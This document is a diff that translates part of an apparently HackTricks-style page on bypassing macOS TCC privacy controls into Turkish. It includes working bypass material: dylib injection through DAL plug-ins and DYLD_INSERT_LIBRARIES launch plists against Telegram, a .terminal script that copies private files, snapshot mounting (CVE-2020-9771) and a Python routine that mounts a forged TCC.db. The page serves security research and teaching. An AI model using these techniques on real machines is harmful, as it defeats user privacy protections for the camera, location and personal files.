 __attribute__((constructor)) static void constructor(int argc, const char **argv) {
 
-    add_tcc_entry();
+add_tcc_entry();
 
-    NSLog(@"[+] Exploitation finished...");
-    exit(0);
+NSLog(@"[+] Exploitation finished...");
+exit(0);
 ```
+Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.
 
-For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
+### Cihaz Soyutlama Katmanı (DAL) Eklentileri
 
-### Device Abstraction Layer (DAL) Plug-Ins
+Kamera akışını Core Media I/O aracılığıyla açan sistem uygulamaları (**`kTCCServiceCamera`** ile uygulamalar) `/Library/CoreMediaIO/Plug-Ins/DAL` konumundaki **bu eklentileri yükler** (SIP kısıtlı değil).
 
-System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).
+Oraya sadece ortak bir **constructor** ile bir kütüphane koymak **kod enjekte etmek** için işe yarayacaktır.
 
-Just storing in there a library with the common **constructor** will work to **inject code**.
-
-Several Apple applications were vulnerable to this.
+Birçok Apple uygulaması buna karşı savunmasızdı.
 
 ### Firefox
 
-The Firefox application had the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:
-
+Firefox uygulaması `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkilerine sahipti:
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -332,58 +319,56 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
-    <true/>
-    <key>com.apple.security.cs.disable-library-validation</key>
-    <true/>
-    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
-    <true/>
-    <key>com.apple.security.device.audio-input</key>
-    <true/>
-    <key>com.apple.security.device.camera</key>
-    <true/>
-    <key>com.apple.security.personal-information.location</key>
-    <true/>
-    <key>com.apple.security.smartcard</key>
-    <true/>
+<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
+<true/>
+<key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
+<true/>
+<key>com.apple.security.device.audio-input</key>
+<true/>
+<key>com.apple.security.device.camera</key>
+<true/>
+<key>com.apple.security.personal-information.location</key>
+<true/>
+<key>com.apple.security.smartcard</key>
+<true/>
 </dict>
 </plist>
 ```
-
-Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
+Daha fazla bilgi için [**orijinal rapora bakın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
 
-The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.
+Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** yetkilerine sahipti, bu da sürece kod enjekte etmeye ve TCC ayrıcalıklarını kullanmaya olanak tanıyordu.
 
 ### CVE-2023-26818 - Telegram
 
-Telegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkilerine sahipti, bu nedenle **izinlerine erişim sağlamak** için kötüye kullanılabiliyordu, örneğin kamerayla kayıt yapmak. [**Payload'ı yazımda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-Note how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`** was used to launch it:
-
+Bir kütüphaneyi yüklemek için env değişkeninin nasıl kullanılacağını not edin; bu kütüphaneyi enjekte etmek için **özel bir plist** oluşturuldu ve **`launchctl`** kullanılarak başlatıldı:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-       <key>Label</key>
-        <string>com.telegram.launcher</string>
-        <key>RunAtLoad</key>
-        <true/>
-        <key>EnvironmentVariables</key>
-        <dict>
-          <key>DYLD_INSERT_LIBRARIES</key>
-          <string>/tmp/telegram.dylib</string>
-        </dict>
-        <key>ProgramArguments</key>
-        <array>
-  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
-        </array>
-        <key>StandardOutPath</key>
-        <string>/tmp/telegram.log</string>
-        <key>StandardErrorPath</key>
-        <string>/tmp/telegram.log</string>
+<key>Label</key>
+<string>com.telegram.launcher</string>
+<key>RunAtLoad</key>
+<true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/tmp/telegram.dylib</string>
+</dict>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
+</array>
+<key>StandardOutPath</key>
+<string>/tmp/telegram.log</string>
+<key>StandardErrorPath</key>
+<string>/tmp/telegram.log</string>
 </dict>
 </plist>
 ```
@@ -391,37 +376,33 @@ Note how to use the env variable to load a library a **custom plist** was create
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+## Açık çağrılarla
 
-## By open invocations
+Sandbox içinde bile **`open`** çağrısı yapmak mümkündür.
 
-It's possible to invoke **`open`** even while sandboxed
+### Terminal Scriptleri
 
-### Terminal Scripts
+Terminale **Tam Disk Erişimi (FDA)** vermek, en azından teknoloji insanları tarafından kullanılan bilgisayarlarda oldukça yaygındır. Ve bununla birlikte **`.terminal`** scriptlerini çağırmak mümkündür.
 
-It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.
-
-**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:
-
+**`.terminal`** scriptleri, **`CommandString`** anahtarında yürütülecek komutla birlikte bu gibi plist dosyalarıdır:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
-    <key>CommandString</key>
-    <string>cp ~/Desktop/private.txt /tmp/;</string>
-    <key>ProfileCurrentVersion</key>
-    <real>2.0600000000000001</real>
-    <key>RunCommandAsShell</key>
-    <false/>
-    <key>name</key>
-    <string>exploit</string>
-    <key>type</key>
-    <string>Window Settings</string>
+<key>CommandString</key>
+<string>cp ~/Desktop/private.txt /tmp/;</string>
+<key>ProfileCurrentVersion</key>
+<real>2.0600000000000001</real>
+<key>RunCommandAsShell</key>
+<false/>
+<key>name</key>
+<string>exploit</string>
+<key>type</key>
+<string>Window Settings</string>
 </dict>
 </plist>
 ```
-
-An application could write a terminal script in a location such as /tmp and launch it with a come such as:
-
+Bir uygulama, /tmp gibi bir konumda bir terminal betiği yazabilir ve bunu şu şekilde başlatabilir:
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -432,14 +413,12 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+## Montaj ile
 
-## By mounting
+### CVE-2020-9771 - mount_apfs TCC atlatma ve ayrıcalık yükseltme
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
-
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
-
+**Herhangi bir kullanıcı** (hatta ayrıcalıksız olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve monte edebilir ve o anlık görüntünün **TÜM dosyalarına** erişebilir.\
+Gerekli olan **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olmasıdır (`kTCCServiceSystemPolicyAllfiles`), bu da bir yönetici tarafından verilmelidir.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -459,13 +438,11 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
+Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+### CVE-2021-1784 & CVE-2021-30808 - TCC dosyasını monte etme
 
-### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file
-
-Even if TCC DB file is protected, It was possible to **mount over the directory** a new TCC.db file:
-
+TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizinin üzerine monte etmek** mümkündü:
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -479,24 +456,23 @@ hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```python
 # This was the python function to create the dmg
 def create_dmg():
-    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
-    os.system("mkdir /tmp/mnt")
-    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
-    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
-    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
-    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
+os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
+os.system("mkdir /tmp/mnt")
+os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
+os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
+os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
+os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
-
 Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).
 
 ### asr
 
-The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.
+Araç **`/usr/sbin/asr`**, tüm diski kopyalamaya ve TCC korumalarını atlayarak başka bir yerde monte etmeye izin veriyordu.
 
 ### Location Services
 
-There is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.\
-The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible to mount our own plist.
+**`/var/db/locationd/clients.plist`** içinde, **konum hizmetlerine** erişim izni verilen istemcileri belirtmek için üçüncü bir TCC veritabanı bulunmaktadır.\
+Klasör **`/var/db/locationd/` DMG montajından korunmuyordu** bu nedenle kendi plist'imizi monte etmek mümkündü.
 
 ## By startup apps
 
@@ -506,17 +482,17 @@ The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was
 
 ## By grep
 
-In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).
+Birçok durumda dosyalar, e-postalar, telefon numaraları, mesajlar gibi hassas bilgileri korunmayan konumlarda saklayacaktır (bu Apple'da bir zafiyet olarak sayılmaktadır).
 
 <figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>
 
 ## Synthetic Clicks
 
-This doesn't work anymore, but it [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
+Bu artık çalışmıyor, ama [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
 
 <figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>
 
-Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):
+Başka bir yol [**CoreGraphics olayları**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanarak:
 
 <figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>
 
@@ -528,4 +504,3 @@ Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/tal
 - [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
 
 {{#include ../../../../../banners/hacktricks-training.md}}
-
